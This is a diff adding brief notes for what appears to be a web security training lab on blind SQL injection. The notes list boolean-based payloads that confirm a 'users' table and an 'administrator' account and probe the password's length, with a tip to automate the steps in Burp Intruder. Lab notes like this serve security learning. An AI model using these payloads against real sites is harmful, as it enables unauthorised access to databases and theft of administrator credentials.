@@ -1,0 +1,18 @@
+Lab #11: 
+
+ Verify that the "Welcome back" message appears in the response. 
+' AND '1'='1
+
+Verify that the "Welcome back" message does not appear in the response. 
+' AND '1'='2
+
+Confirming that there is a table called users
+' and (select 'a' from users LIMIT 1)='a
+
+Confirming that there is a user called administrator. 
+' and (select 'a' from users where username='administrator')='a
+
+Confirming that the password is greater than 1 character in length. 
+' and (select 'a' from users where username='administrator' and length(password)>1)='a
+
+Repeat this step with incrementing the value from 1 to 19. Use burp intruder to automate this.
